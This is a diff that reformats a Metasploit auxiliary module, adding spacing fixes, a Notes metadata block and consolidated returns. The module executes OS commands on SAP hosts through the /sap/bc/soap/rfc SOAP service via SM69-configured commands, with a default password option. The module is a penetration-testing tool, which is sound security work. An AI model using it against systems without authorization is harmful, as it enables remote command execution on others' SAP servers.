@@ -27,16 +27,19 @@ class MetasploitModule < Msf::Auxiliary
         the use of the /sap/bc/soap/rfc SOAP service to execute OS commands as configured
         in the SM69 transaction.
         },
-      'References' =>
-        [
-          [ 'URL', 'https://labs.f-secure.com/tools/sap-metasploit-modules/' ]
-        ],
-      'Author' =>
-        [
-          'Agnivesh Sathasivam',
-          'nmonkee'
-        ],
-      'License' => MSF_LICENSE
+      'References' => [
+        [ 'URL', 'https://labs.f-secure.com/tools/sap-metasploit-modules/' ]
+      ],
+      'Author' => [
+        'Agnivesh Sathasivam',
+        'nmonkee'
+      ],
+      'License' => MSF_LICENSE,
+      'Notes' => {
+        'Stability' => [CRASH_SAFE],
+        'SideEffects' => [IOC_IN_LOGS],
+        'Reliability' => []
+      }
     )
     register_options(
       [
@@ -46,8 +49,9 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('HttpPassword', [true, 'Password', '06071992']),
         OptString.new('CMD', [true, 'SM69 command to be executed', 'PING']),
         OptString.new('PARAM', [false, 'Additional parameters for the SM69 command', nil]),
-        OptEnum.new('OS', [true, 'SM69 Target OS','ANYOS',['ANYOS', 'UNIX', 'Windows NT', 'AS/400', 'OS/400']])
-      ])
+        OptEnum.new('OS', [true, 'SM69 Target OS', 'ANYOS', ['ANYOS', 'UNIX', 'Windows NT', 'AS/400', 'OS/400']])
+      ]
+    )
   end
 
   def run_host(ip)
@@ -77,44 +81,41 @@ class MetasploitModule < Msf::Auxiliary
         'ctype' => 'text/xml; charset=UTF-8',
         'encode_params' => false,
         'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),
-        'headers' =>{
-          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
+        'headers' => {
+          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions'
         },
         'vars_get' => {
-          'sap-client'    => datastore['CLIENT'],
-          'sap-language'  => 'EN'
+          'sap-client' => datastore['CLIENT'],
+          'sap-language' => 'EN'
         }
       })
-      if res and res.code != 500 and res.code != 200
+      if res && (res.code != 500) && (res.code != 200)
         # to do - implement error handlers for each status code, 404, 301, etc.
         print_error("[SAP] #{ip}:#{rport} - something went wrong!")
-        return
-      elsif res and res.body =~ /faultstring/
+      elsif res && res.body =~ /faultstring/
         error = res.body.scan(%r{<faultstring>(.*?)</faultstring>}).flatten
-        0.upto(error.length-1) do |i|
+        0.upto(error.length - 1) do |i|
           print_error("[SAP] #{ip}:#{rport} - error #{error[i]}")
         end
-        return
       elsif res
         print_status("[SAP] #{ip}:#{rport} - got response")
         saptbl = Msf::Ui::Console::Table.new(
           Msf::Ui::Console::Table::Style::Default,
-            'Header' => "[SAP] SXPG_COMMAND_EXECUTE ",
-            'Prefix' => "\n",
-            'Postfix' => "\n",
-            'Indent'  => 1,
-            'Columns' =>["Output",]
-            )
+          'Header' => '[SAP] SXPG_COMMAND_EXECUTE ',
+          'Prefix' => "\n",
+          'Postfix' => "\n",
+          'Indent' => 1,
+          'Columns' => ['Output',]
+        )
         output = res.body.scan(%r{<MESSAGE>([^<]+)</MESSAGE>}).flatten
-        for i in 0..output.length-1
+        for i in 0..output.length - 1
           saptbl << [output[i]]
         end
-        print(saptbl.to_s)
-        return
+        print(saptbl)
       else
         print_error("[SAP] #{ip}:#{rport} - Unknown error")
-        return
       end
+      return
     rescue ::Rex::ConnectionError
       print_error("[SAP] #{ip}:#{rport} - Unable to connect")
       return
